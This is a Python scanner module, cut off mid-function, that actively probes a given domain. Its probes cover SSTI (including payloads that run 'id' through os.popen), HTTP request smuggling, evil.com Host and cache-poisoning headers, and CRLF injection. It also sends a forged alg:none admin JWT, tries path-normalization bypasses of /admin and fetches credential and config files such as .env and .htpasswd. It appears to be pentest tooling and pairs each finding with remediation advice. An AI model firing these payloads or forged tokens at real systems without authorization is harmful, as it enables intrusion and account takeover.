#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Zero-Day Vulnerability Scanner Module
وحدة اكتشاف الثغرات الصفرية الحقيقية

Author: SayerLinux
Enhanced with Zero-Day Detection

Techniques used:
- NVD/CVE API integration for real-time CVE lookup
- Technology fingerprinting & version detection
- Server-Side Template Injection (SSTI)
- HTTP Request Smuggling (CL.TE / TE.CL)
- Cache Poisoning via Host/X-Forwarded headers
- Host Header Injection
- HTTP/2 downgrade attacks
- Prototype Pollution (Node.js)
- Deserialization detection
- GraphQL introspection & injection
- JWT algorithm confusion (alg:none / RS→HS)
- OAuth misconfigurations
- Web Cache Deception
- API versioning exposure
- CRLF Injection
- Path Normalization bypass
- Parameter Pollution
- Dependency Confusion checks
"""

import re
import json
import time
import socket
import hashlib
import urllib.parse
import concurrent.futures
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich import print as rprint
    console = Console()
except ImportError:
    class Console:
        def print(self, *args, **kwargs): print(*args)
    console = Console()


# ─────────────────────────────────────────────────────────────────────────────
# Constants & Signatures
# ─────────────────────────────────────────────────────────────────────────────

NVD_API_URL  = "https://services.nvd.nist.gov/rest/json/cves/2.0"
NVD_API_KEY  = ""            # Optionally set NIST API key for higher rate-limit

SSTI_PAYLOADS = [
    # Generic math probes
    ("{{7*7}}",           "49",     "Jinja2/Twig/Pebble"),
    ("${7*7}",            "49",     "FreeMarker/Velocity/EL"),
    ("#{7*7}",            "49",     "Thymeleaf/Mako"),
    ("*{7*7}",            "49",     "Spring EL"),
    ("<%= 7*7 %>",        "49",     "ERB/JSP"),
    ("{{7*'7'}}",         "7777777","Jinja2 confirmed"),
    ("${{7*7}}",          "49",     "Pebble/Twig"),
    ("{#7*7#}",           "49",     "Nunjucks"),
    ("@(7*7)",            "49",     "Razor"),
    ("#{7*7}",            "49",     "Ruby ERB"),
]

SSTI_BLIND_PAYLOADS = [
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
]

SMUGGLING_HEADERS_CLTE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
)

SMUGGLING_HEADERS_TECL = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)

CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host",  "evil.com"),
    ("X-Host",            "evil.com"),
    ("X-Forwarded-Server","evil.com"),
    ("X-Original-URL",    "/admin"),
    ("X-Rewrite-URL",     "/admin"),
    ("Forwarded",         "host=evil.com"),
    ("X-Forwarded-Prefix","/admin"),
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "evil.com:80",
    "evil.com:443",
    "localhost",
    "127.0.0.1",
    "169.254.169.254",
    "0.0.0.0",
]

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:zeroday=1",
    "%0aSet-Cookie:zeroday=1",
    "%0d%0a%20Set-Cookie:zeroday=1",
    "\\r\\nSet-Cookie:zeroday=1",
    "%E5%98%8D%E5%98%8ASet-Cookie:zeroday=1",
]

JWT_NONE_TEMPLATE = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"  # header: {"alg":"none","typ":"JWT"}
    ".{payload}"
    "."                                      # empty signature
)

GRAPHQL_INTROSPECTION = """{"query":"{__schema{types{name fields{name}}}}", "operationName": null}"""

PROTOTYPE_POLLUTION_PAYLOADS = [
    '{"__proto__":{"polluted":"yes"}}',
    '{"constructor":{"prototype":{"polluted":"yes"}}}',
]

DESERIALIZATION_PROBES = {
    "Java":    b"\xac\xed\x00\x05",           # Java serialized object magic bytes
    "PHP":     b'O:8:"stdClass":0:{}',
    "Python":  b"\x80\x02}q\x00.",             # pickle
    ".NET":    b"\x00\x01\x00\x00\x00\xff\xff\xff\xff",
}

PATH_NORMALIZATION_PAYLOADS = [
    "/..;/admin",
    "/%2e%2e/admin",
    "/%252e%252e/admin",
    "/./admin",
    "/admin/./",
    "//admin",
    "/admin%20",
    "/admin%09",
]

# Technologies fingerprint signatures → {header/body pattern: (tech_name, version_regex)}
TECH_SIGNATURES: Dict[str, List[Tuple]] = {
    "headers": [
        ("server",          r"Apache/([\d.]+)",            "Apache HTTP Server"),
        ("server",          r"nginx/([\d.]+)",             "nginx"),
        ("server",          r"Microsoft-IIS/([\d.]+)",     "Microsoft IIS"),
        ("server",          r"lighttpd/([\d.]+)",          "lighttpd"),
        ("x-powered-by",    r"PHP/([\d.]+)",               "PHP"),
        ("x-powered-by",    r"ASP\.NET",                   "ASP.NET"),
        ("x-powered-by",    r"Express",                    "Express.js"),
        ("x-generator",     r"Drupal\s*([\d.]+)?",         "Drupal"),
        ("x-drupal-cache",  r".*",                         "Drupal"),
        ("x-pingback",      r".*xmlrpc",                   "WordPress"),
    ],
    "body": [
        (r"wp-content/themes/",                            "WordPress"),
        (r"wp-includes/",                                  "WordPress"),
        (r"<meta name=['\"]generator['\"] content=['\"]WordPress ([\d.]+)", "WordPress"),
        (r"<meta name=['\"]generator['\"] content=['\"]Joomla! ([\d.]+)",   "Joomla"),
        (r"Drupal\.settings",                              "Drupal"),
        (r"/sites/default/files/",                         "Drupal"),
        (r"Powered by <a href=['\"]https?://www\.prestashop",               "PrestaShop"),
        (r"Magento",                                       "Magento"),
        (r"var Shopify =",                                 "Shopify"),
        (r"confluence",                                    "Confluence"),
        (r"JIRA",                                          "Jira"),
        (r"Jenkins",                                       "Jenkins"),
    ],
}

# Sensitive endpoint paths
SENSITIVE_PATHS = [
    # Git / Source
    "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
    "/.svn/entries", "/.hg/hgrc",
    # Env / Config
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/config.php", "/config.yml", "/config.yaml", "/config.json",
    "/app.config", "/web.config", "/appsettings.json",
    "/database.yml", "/database.php",
    # Backup
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sql",
    "/dump.sql", "/site.tar.gz",
    # Admin
    "/.htaccess", "/.htpasswd",
    "/phpinfo.php", "/info.php", "/test.php",
    "/server-status", "/server-info",
    # GraphQL / API
    "/graphql", "/api/graphql", "/v1/graphql",
    "/api/v1", "/api/v2", "/api/v3",
    "/swagger.json", "/swagger-ui.html",
    "/openapi.json", "/api-docs",
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/beans", "/actuator/mappings",
    # Cloud metadata
    "/latest/meta-data/",
    # PHP special
    "/vendor/composer/installed.json",
    "/composer.json", "/package.json",
    # Docker / K8s
    "/.dockerenv",
    "/etc/kubernetes/admin.conf",
]


# ─────────────────────────────────────────────────────────────────────────────
# Helper
# ─────────────────────────────────────────────────────────────────────────────

def _make_session(user_agent: str = None, timeout: int = 15) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": user_agent or (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })
    s.verify = False
    return s


def _request_safe(session: requests.Session, method: str, url: str,
                   timeout: int = 15, **kwargs) -> Optional[requests.Response]:
    try:
        return session.request(method, url, timeout=timeout, **kwargs)
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Main Class
# ─────────────────────────────────────────────────────────────────────────────

class ZeroDayScanner:
    """
    Zero-Day Vulnerability Discovery Engine
    ─────────────────────────────────────────
    Performs real active probing for:
      • Technology fingerprinting + NVD CVE lookup
      • Server-Side Template Injection (SSTI)
      • HTTP Request Smuggling (CL.TE / TE.CL)
      • Web Cache Poisoning
      • Host Header Injection
      • CRLF Injection
      • JWT Algorithm Confusion (alg:none)
      • GraphQL Introspection & Injection
      • Prototype Pollution (Node.js)
      • Deserialization probes
      • Path Normalization bypass
      • Exposed sensitive files & endpoints
      • HTTP/2 Rapid Reset (CVE-2023-44487) fingerprint
      • Open API / Actuator exposure
    """

    SEVERITY_COLORS = {
        "CRITICAL": "[bold red]",
        "HIGH":     "[bold orange1]",
        "MEDIUM":   "[bold yellow]",
        "LOW":      "[bold cyan]",
        "INFO":     "[bold green]",
    }

    def __init__(self, domain: str, threads: int = 10,
                 timeout: int = 20, user_agent: str = None,
                 nvd_api_key: str = ""):
        self.domain      = domain.strip().lower()
        self.base_url    = f"https://{self.domain}"
        self.threads     = threads
        self.timeout     = timeout
        self.session     = _make_session(user_agent, timeout)
        self.nvd_api_key = nvd_api_key or NVD_API_KEY
        self.findings: List[Dict] = []
        self._tech_stack: Dict[str, str] = {}   # {"WordPress": "6.4.1", ...}
        self._crawled_urls: List[str] = []

    # ──────────────────────────────────────────────────────────────────────
    # Public entry-point
    # ──────────────────────────────────────────────────────────────────────

    def scan(self) -> List[Dict]:
        """Run all zero-day discovery modules and return findings."""
        console.print(Panel.fit(
            f"[bold cyan]🔍 Zero-Day Scanner[/bold cyan]\n"
            f"[white]Target:[/white] [bold green]{self.domain}[/bold green]\n"
            f"[dim]Threads: {self.threads} | Timeout: {self.timeout}s[/dim]",
            border_style="cyan"
        ))

        steps = [
            ("🖥️  Technology Fingerprinting",       self._fingerprint_tech),
            ("🗄️  NVD/CVE Lookup",                  self._nvd_cve_lookup),
            ("📂  Sensitive Files & Endpoints",      self._check_sensitive_paths),
            ("🧩  SSTI Detection",                   self._check_ssti),
            ("🚚  HTTP Request Smuggling",           self._check_request_smuggling),
            ("☠️   Cache Poisoning",                  self._check_cache_poisoning),
            ("🏠  Host Header Injection",            self._check_host_header_injection),
            ("↩️   CRLF Injection",                   self._check_crlf),
            ("🔑  JWT Algorithm Confusion",          self._check_jwt),
            ("🕸️   GraphQL Exposure",                 self._check_graphql),
            ("☢️   Prototype Pollution",              self._check_prototype_pollution),
            ("📦  Deserialization Probe",            self._check_deserialization),
            ("🛤️   Path Normalization Bypass",        self._check_path_normalization),
            ("⚡  HTTP/2 Rapid Reset Fingerprint",  self._check_http2_rapid_reset),
            ("🔓  Open API / Actuator Exposure",    self._check_api_exposure),
        ]

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            transient=True,
        ) as progress:
            task = progress.add_task("", total=len(steps))
            for label, func in steps:
                progress.update(task, description=label)
                try:
                    func()
                except Exception as exc:
                    pass   # never crash the whole scan on a single module error
                progress.advance(task)

        self._print_summary()
        return self.findings

    # ──────────────────────────────────────────────────────────────────────
    # 1. Technology Fingerprinting
    # ──────────────────────────────────────────────────────────────────────

    def _fingerprint_tech(self):
        resp = _request_safe(self.session, "GET", self.base_url, self.timeout)
        if not resp:
            return

        for hdr_name, version_re, tech_name in TECH_SIGNATURES["headers"]:
            hdr_val = resp.headers.get(hdr_name, "")
            m = re.search(version_re, hdr_val, re.I)
            if m:
                ver = m.group(1) if m.lastindex else "detected"
                self._tech_stack[tech_name] = ver

        body = resp.text
        for item in TECH_SIGNATURES["body"]:
            if len(item) == 2:
                pattern, tech_name = item
                version_re = None
            else:
                pattern, tech_name = item[0], item[1]
                version_re = pattern

            m = re.search(pattern, body, re.I)
            if m:
                ver = m.group(1) if (m.lastindex and m.lastindex >= 1) else "detected"
                self._tech_stack[tech_name] = ver

        # Check X-Powered-By / X-Generator
        xpb = resp.headers.get("x-powered-by", "")
        if xpb:
            self._add_finding(
                vuln_type="Technology Disclosure",
                severity="INFO",
                url=self.base_url,
                description=f"Server reveals technology via X-Powered-By: {xpb}",
                evidence=xpb,
                poc=self._poc_tech_disclosure(xpb),
                remediation="Remove X-Powered-By header. "
                             "In PHP: expose_php = Off; "
                             "In Express: app.disable('x-powered-by');"
            )

        if self._tech_stack:
            tech_list = ", ".join(f"{t} {v}" for t, v in self._tech_stack.items())
            console.print(f"  [green]→ Detected:[/green] {tech_list}")

    # ──────────────────────────────────────────────────────────────────────
    # 2. NVD / CVE Lookup
    # ──────────────────────────────────────────────────────────────────────

    def _nvd_cve_lookup(self):
        if not self._tech_stack:
            return

        # Use the last 6 months window
        pub_start = (datetime.utcnow() - timedelta(days=180)).strftime("%Y-%m-%dT00:00:00.000")
        pub_end   = datetime.utcnow().strftime("%Y-%m-%dT23:59:59.999")

        for tech, version in list(self._tech_stack.items())[:6]:  # limit API calls
            params = {
                "keywordSearch": tech,
                "pubStartDate": pub_start,
                "pubEndDate":   pub_end,
                "resultsPerPage": 10,
            }
            headers = {}
            if self.nvd_api_key:
                headers["apiKey"] = self.nvd_api_key

            try:
                r = requests.get(NVD_API_URL, params=params, headers=headers,
                                 timeout=20, verify=False)
                if r.status_code != 200:
                    continue
                data = r.json()
            except Exception:
                continue

            for item in data.get("vulnerabilities", []):
                cve  = item.get("cve", {})
                cveid = cve.get("id", "")
                desc_list = cve.get("descriptions", [])
                desc = next((d["value"] for d in desc_list if d.get("lang") == "en"), "")
                metrics = cve.get("metrics", {})
                score, severity = self._extract_cvss(metrics)

                # Only report HIGH / CRITICAL
                if severity not in ("CRITICAL", "HIGH"):
                    continue

                refs = [r2.get("url", "") for r2 in cve.get("references", [])[:3]]
                self._add_finding(
                    vuln_type=f"CVE: {cveid}",
                    severity=severity,
                    url=refs[0] if refs else f"https://nvd.nist.gov/vuln/detail/{cveid}",
                    description=(
                        f"[{tech} {version}] {desc[:300]}"
                    ),
                    evidence=f"CVSS Score: {score} | {cveid}",
                    poc=self._poc_cve(cveid, tech, version, refs),
                    remediation=f"Update {tech} to the latest patched version. "
                                f"See: https://nvd.nist.gov/vuln/detail/{cveid}",
                    cve_id=cveid,
                )
            time.sleep(0.6)   # NVD rate-limit: 5 req/30 s without key

    @staticmethod
    def _extract_cvss(metrics: dict) -> Tuple[float, str]:
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            m_list = metrics.get(key, [])
            if m_list:
                cvss_data = m_list[0].get("cvssData", {})
                score    = cvss_data.get("baseScore", 0.0)
                severity = m_list[0].get("baseSeverity", "").upper()
                if not severity:
                    if score >= 9.0:   severity = "CRITICAL"
                    elif score >= 7.0: severity = "HIGH"
                    elif score >= 4.0: severity = "MEDIUM"
                    else:              severity = "LOW"
                return score, severity
        return 0.0, "UNKNOWN"

    # ──────────────────────────────────────────────────────────────────────
    # 3. Sensitive Files
    # ──────────────────────────────────────────────────────────────────────

    def _check_sensitive_paths(self):
        def probe(path):
            url = self.base_url + path
            r   = _request_safe(self.session, "GET", url, self.timeout,
                                 allow_redirects=False)
            if r is None:
                return
            if r.status_code in (200, 206):
                snippet = r.text[:200].replace("\n", " ")
                # Avoid false-positives from custom 200 error pages
                false_pos = ["404", "not found", "error", "forbidden"]
                if any(fp in snippet.lower() for fp in false_pos) and len(r.text) < 600:
                    return
                severity = "HIGH" if path in ("/.git/HEAD", "/.env", "/.htpasswd",
                                               "/phpinfo.php") else "MEDIUM"
                self._add_finding(
                    vuln_type="Sensitive File Exposure",
                    severity=severity,
                    url=url,
                    description=f"Sensitive resource is publicly accessible: {path}",
                    evidence=f"HTTP {r.status_code} | Size: {len(r.content)} bytes | "
                             f"Preview: {snippet[:100]}",
                    poc=self._poc_sensitive_file(url),
                    remediation=(
                        "Restrict access via .htaccess or web server config. "
                        "Remove sensitive files from the web root. "
                        "Add deny rules: 'Deny from all' or 'location ~ /\\.git { deny all; }'"
                    ),
                )

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            ex.map(probe, SENSITIVE_PATHS)

    # ──────────────────────────────────────────────────────────────────────
    # 4. Server-Side Template Injection (SSTI)
    # ──────────────────────────────────────────────────────────────────────

    def _check_ssti(self):
        """
        Probe URL query parameters and POST body for SSTI.
        First crawls a page to get real parameters.
        """
        resp = _request_safe(self.session, "GET", self.base_url, self.timeout)
        if not resp:
            return

        # Extract query-string parameters from links
        params_found = set()
        for m in re.finditer(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{0,30})=', resp.text):
            params_found.add(m.group(1))

        # Add common parameter names
        params_found.update(["q", "s", "search", "query", "name",
                              "id", "page", "template", "view", "lang",
                              "file", "path", "redirect", "url"])

        for param in list(params_found)[:20]:
            for payload, expected, engine in SSTI_PAYLOADS:
                test_url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                r = _request_safe(self.session, "GET", test_url, self.timeout)
                if r and expected in r.text:
                    self._add_finding(
                        vuln_type="Server-Side Template Injection (SSTI)",
                        severity="CRITICAL",
                        url=test_url,
                        description=(
                            f"SSTI detected in parameter '{param}' — "
                            f"engine fingerprint: {engine}. "
                            "Attacker can execute arbitrary OS commands on the server."
                        ),
                        evidence=(
                            f"Payload: {payload} → Response contains: {expected}"
                        ),
                        poc=self._poc_ssti(test_url, param, payload, engine),
                        remediation=(
                            "Never pass user input directly to template engines. "
                            "Use a sandboxed environment. "
                            "Whitelist allowed template expressions. "
                            "In Jinja2: use Environment(sandbox=True)."
                        ),
                    )
                    return   # found — skip further probing

    # ──────────────────────────────────────────────────────────────────────
    # 5. HTTP Request Smuggling
    # ──────────────────────────────────────────────────────────────────────

    def _check_request_smuggling(self):
        """
        Send a CL.TE probe using raw TCP and measure differential timing.
        A significant difference (~5 s) indicates smuggling vulnerability.
        """
        host = self.domain
        port = 443

        def _raw_request(raw: str) -> Optional[float]:
            try:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with socket.create_connection((host, port), timeout=self.timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        t0 = time.time()
                        ssock.sendall(raw.encode())
                        ssock.recv(4096)
                        return time.time() - t0
            except Exception:
                return None

        clte_raw = SMUGGLING_HEADERS_CLTE.format(host=host)
        normal_raw = (
            f"POST / HTTP/1.1\r\nHost: {host}\r\n"
            f"Content-Length: 0\r\n\r\n"
        )

        t_normal  = _raw_request(normal_raw)
        t_smuggle = _raw_request(clte_raw)

        if t_normal and t_smuggle and (t_smuggle - t_normal) > 4.5:
            self._add_finding(
                vuln_type="HTTP Request Smuggling (CL.TE)",
                severity="CRITICAL",
                url=f"https://{self.domain}/",
                description=(
                    "The server accepted a conflicting Content-Length / "
                    "Transfer-Encoding pair indicating CL.TE smuggling. "
                    "An attacker can poison the request queue, hijack sessions, "
                    "and bypass security controls."
                ),
                evidence=(
                    f"Normal request time: {t_normal:.2f}s | "
                    f"Smuggled request time: {t_smuggle:.2f}s | "
                    f"Delay: {t_smuggle - t_normal:.2f}s (>4.5s threshold)"
                ),
                poc=self._poc_smuggling(host),
                remediation=(
                    "Normalize Transfer-Encoding and Content-Length headers. "
                    "Reject ambiguous requests at the front-end proxy. "
                    "Enable HTTP/2 end-to-end (disables HTTP/1.1 request smuggling). "
                    "Set: 'Content-Length' takes precedence, reject chunked with CL."
                ),
            )

    # ──────────────────────────────────────────────────────────────────────
    # 6. Cache Poisoning
    # ──────────────────────────────────────────────────────────────────────

    def _check_cache_poisoning(self):
        """
        Check if unkeyed headers (X-Forwarded-Host, etc.) alter the response,
        indicating potential cache-poisoning.
        """
        baseline = _request_safe(self.session, "GET", self.base_url, self.timeout)
        if baseline is None:
            return
        baseline_body = baseline.text

        for header, value in CACHE_POISON_HEADERS:
            r = _request_safe(
                self.session, "GET", self.base_url, self.timeout,
                headers={header: value},
            )
            if r is None:
                continue

            # If the injected value appears in the response body — cache poisoning candidate
            if value in r.text and value not in baseline_body:
                self._add_finding(
                    vuln_type="Web Cache Poisoning",
                    severity="HIGH",
                    url=self.base_url,
                    description=(
                        f"Header '{header}: {value}' was reflected in the response "
                        "body but is NOT part of the cache key. This allows an "
                        "attacker to poison the cache and serve malicious content "
                        "to all users."
                    ),
                    evidence=(
                        f"Injected header: {header}: {value}\n"
                        f"Value reflected in response: YES"
                    ),
                    poc=self._poc_cache_poisoning(header, value),
                    remediation=(
                        f"Add '{header}' to the cache key, or remove its reflection "
                        "in the response. Configure CDN/proxy to strip unrecognized "
                        "headers before forwarding."
                    ),
                )
                break   # one finding is enough

    # ──────────────────────────────────────────────────────────────────────
    # 7. Host Header Injection
    # ──────────────────────────────────────────────────────────────────────

    def _check_host_header_injection(self):
        for evil_host in HOST_HEADER_PAYLOADS:
            r = _request_safe(
                self.session, "GET", self.base_url, self.timeout,
                headers={"Host": evil_host},
            )
            if r is None:
                continue
            if evil_host in r.text or (
                r.headers.get("location", "").find(evil_host) != -1
            ):
                self._add_finding(
                    vuln_type="Host Header Injection",
                    severity="HIGH",
                    url=self.base_url,
                    description=(
                        f"The application reflects an arbitrary Host header "
                        f"('{evil_host}') in the response. This can be exploited "
                        "for password-reset poisoning, SSRF, or cache poisoning."
                    ),
                    evidence=(
                        f"Injected Host: {evil_host} → reflected in response"
                    ),
                    poc=self._poc_host_header(evil_host),
                    remediation=(
                        "Validate the Host header against an allowlist of "
                        "legitimate domain names. "
                        "Do not use HOST header value in email links or redirects "
                        "without validation."
                    ),
                )
                return

    # ──────────────────────────────────────────────────────────────────────
    # 8. CRLF Injection
    # ──────────────────────────────────────────────────────────────────────

    def _check_crlf(self):
        for payload in CRLF_PAYLOADS:
            test_url = f"{self.base_url}/{payload}"
            r = _request_safe(self.session, "GET", test_url, self.timeout,
                               allow_redirects=False)
            if r is None:
                continue
            if "zeroday=1" in r.headers.get("set-cookie", "").lower() or \
               "zeroday=1" in str(r.headers).lower():
                self._add_finding(
                    vuln_type="CRLF Injection",
                    severity="HIGH",
                    url=test_url,
                    description=(
                        "CRLF characters in the URL were interpreted by the server, "
                        "allowing injection of arbitrary HTTP response headers "
                        "(e.g., Set-Cookie). Enables session fixation, XSS, and "
                        "cache poisoning."
                    ),
                    evidence=f"Payload: {payload} → Set-Cookie injected",
                    poc=self._poc_crlf(test_url, payload),
                    remediation=(
                        "Strip or encode \\r (0x0D) and \\n (0x0A) in user-controlled "
                        "input used in HTTP headers or redirect URLs. "
                        "Use a framework that handles this automatically."
                    ),
                )
                return

    # ──────────────────────────────────────────────────────────────────────
    # 9. JWT Algorithm Confusion
    # ──────────────────────────────────────────────────────────────────────

    def _check_jwt(self):
        """
        Probe /api/me or /profile with a JWT signed with alg:none.
        If we get 200 (authenticated), the server is vulnerable.
        """
        import base64

        payload_dict = {
            "sub": "admin",
            "name": "Administrator",
            "role": "admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 86400,
        }
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload_dict).encode()
        ).rstrip(b"=").decode()

        jwt_none = (
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
            f".{payload_b64}."
        )

        test_paths = ["/api/me", "/api/user", "/profile",
                      "/api/admin", "/dashboard", "/api/account"]
        for path in test_paths:
            url = self.base_url + path
            r   = _request_safe(
                self.session, "GET", url, self.timeout,
                headers={"Authorization": f"Bearer {jwt_none}"}
            )
            if r and r.status_code == 200:
                self._add_finding(
                    vuln_type="JWT Algorithm Confusion (alg:none)",
                    severity="CRITICAL",
                    url=url,
                    description=(
                        "The server accepted a JWT token with 'alg: none', "
                        "meaning no signature verification is performed. "
                        "An attacker can forge arbitrary tokens and impersonate "
                        "any user, including administrators."
                    ),
                    evidence=(
                        f"Token with alg:none returned HTTP 200 at {path}"
                    ),
                    poc=self._poc_jwt_none(url, jwt_none),
                    remediation=(
                        "Reject tokens with alg:none. "
                        "Whitelist only expected algorithms (e.g., RS256). "
                        "Use a well-maintained JWT library (e.g., python-jose, "
                        "jsonwebtoken) with explicit algorithm enforcement."
                    ),
                )
                return

    # ──────────────────────────────────────────────────────────────────────
    # 10. GraphQL Exposure
    # ──────────────────────────────────────────────────────────────────────

    def _check_graphql(self):
        endpoints = ["/graphql", "/api/graphql", "/v1/graphql",
                     "/graphiql", "/playground"]
        for ep in endpoints:
            url = self.base_url + ep
            r   = _request_safe(
                self.session, "POST", url, self.timeout,
                json={"query": "{__typename}"},
                headers={"Content-Type": "application/json"},
            )
            if r is None or r.status_code not in (200, 400):
                continue
            if "data" in r.text or "__typename" in r.text or "errors" in r.text:
                # Try full introspection
                r2 = _request_safe(
                    self.session, "POST", url, self.timeout,
                    data=GRAPHQL_INTROSPECTION,
                    headers={"Content-Type": "application/json"},
                )
                introspection_enabled = r2 and "__schema" in r2.text

                self._add_finding(
                    vuln_type="GraphQL Introspection / Exposure",
                    severity="HIGH" if introspection_enabled else "MEDIUM",
                    url=url,
                    description=(
                        f"GraphQL endpoint is publicly accessible at {ep}. "
                        + ("Full schema introspection is ENABLED — "
                           "the entire API schema is exposed to attackers."
                           if introspection_enabled else
                           "Introspection is disabled but endpoint is reachable.")
                    ),
                    evidence=(
                        f"Endpoint: {url} | Introspection: "
                        f"{'ENABLED' if introspection_enabled else 'disabled'}"
                    ),
                    poc=self._poc_graphql(url, introspection_enabled),
                    remediation=(
                        "Disable introspection in production. "
                        "Implement authentication on GraphQL endpoints. "
                        "Apply query depth/complexity limits. "
                        "Use persisted queries only."
                    ),
                )
                return

    # ──────────────────────────────────────────────────────────────────────
    # 11. Prototype Pollution
    # ──────────────────────────────────────────────────────────────────────

    def _check_prototype_pollution(self):
        uid = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        canary = f"polluted_{uid}"
        for payload_tmpl in PROTOTYPE_POLLUTION_PAYLOADS:
            payload = payload_tmpl.replace("yes", canary)
            test_url = f"{self.base_url}/api"
            r = _request_safe(
                self.session, "POST", test_url, self.timeout,
                data=payload,
                headers={"Content-Type": "application/json"},
            )
            if r and canary in r.text:
                self._add_finding(
                    vuln_type="Prototype Pollution (Node.js)",
                    severity="HIGH",
                    url=test_url,
                    description=(
                        "The server reflected a prototype pollution payload "
                        "in the response body, indicating the application "
                        "(likely Node.js/Express) is vulnerable. "
                        "An attacker can manipulate the base Object prototype "
                        "and escalate privileges or achieve RCE."
                    ),
                    evidence=f"Payload: {payload} → '{canary}' reflected",
                    poc=self._poc_prototype_pollution(test_url, payload),
                    remediation=(
                        "Freeze the Object prototype: Object.freeze(Object.prototype). "
                        "Validate JSON keys against a whitelist (reject __proto__, constructor). "
                        "Use safe-merge libraries (e.g., lodash >= 4.17.21). "
                        "Set NODE_OPTIONS=--require frozen-intrinsics."
                    ),
                )
                return

    # ──────────────────────────────────────────────────────────────────────
    # 12. Deserialization Probe
    # ──────────────────────────────────────────────────────────────────────

    def _check_deserialization(self):
        """
        Send known deserialization magic-byte payloads and watch for
        unusual errors (500 with stack traces), which indicate
        deserialization of untrusted data.
        """
        test_paths = ["/deserialize", "/api/deserialize",
                      "/upload", "/process", "/data"]
        for path in test_paths:
            url = self.base_url + path
            for lang, magic in DESERIALIZATION_PROBES.items():
                r = _request_safe(
                    self.session, "POST", url, self.timeout,
                    data=magic,
                    headers={"Content-Type": "application/octet-stream"},
                )
                if r is None:
                    continue
                indicators = [
                    "ClassNotFoundException",
                    "java.io.InvalidClassException",
                    "Caused by:",
                    "unserialize()",
                    "Pickle",
                    "RuntimeError",
                    "DeserializationException",
                ]
                triggered = [ind for ind in indicators if ind.lower() in r.text.lower()]
                if triggered:
                    self._add_finding(
                        vuln_type=f"Insecure Deserialization ({lang})",
                        severity="CRITICAL",
                        url=url,
                        description=(
                            f"The endpoint {path} attempted to deserialize a raw "
                            f"{lang} serialized object and returned a stack trace. "
                            "Insecure deserialization can lead to Remote Code Execution."
                        ),
                        evidence=(
                            f"Magic bytes sent | Error indicators: {triggered}"
                        ),
                        poc=self._poc_deserialization(url, lang),
                        remediation=(
                            "Never deserialize untrusted data. "
                            "Use JSON/XML instead of native serialization. "
                            "Implement an allow-list of deserializable classes. "
                            "In Java, use SerialKiller or NotSoSerial agents. "
                            "In Python, avoid pickle with untrusted input."
                        ),
                    )
                    return

    # ──────────────────────────────────────────────────────────────────────
    # 13. Path Normalization Bypass
    # ──────────────────────────────────────────────────────────────────────

    def _check_path_normalization(self):
        # Try to access /admin directly first (baseline)
        admin_url   = self.base_url + "/admin"
        r_baseline  = _request_safe(self.session, "GET", admin_url, self.timeout,
                                     allow_redirects=False)
        baseline_code = r_baseline.status_code if r_baseline else 403

        if baseline_code in (200, 201, 301, 302):
            return   # admin is already open — not a path bypass issue

        for path in PATH_NORMALIZATION_PAYLOADS:
            url = self.base_url + path
            r   = _request_safe(self.session, "GET", url, self.timeout,
                                  allow_redirects=True)
            if r and r.status_code in (200, 201):
                if "admin" in r.text.lower() or "dashboard" in r.text.lower():
                    self._add_finding(
                        vuln_type="Path Normalization / Access Control Bypass",
                        severity="CRITICAL",
                        url=url,
                        description=(
                            f"Access to a restricted path (/admin → {path}) was granted "
                            "after URL normalization bypass. The server or middleware "
                            "applies access controls BEFORE normalization, allowing "
                            "attackers to circumvent authorization checks."
                        ),
                        evidence=(
                            f"Baseline /admin: HTTP {baseline_code} | "
                            f"Bypass path {path}: HTTP {r.status_code}"
                        ),
                        poc=self._poc_path_normalization(url, path),
                        remediation=(
                            "Apply access controls AFTER URL normalization. "
                            "Reject paths containing '..' or double-encoding. "
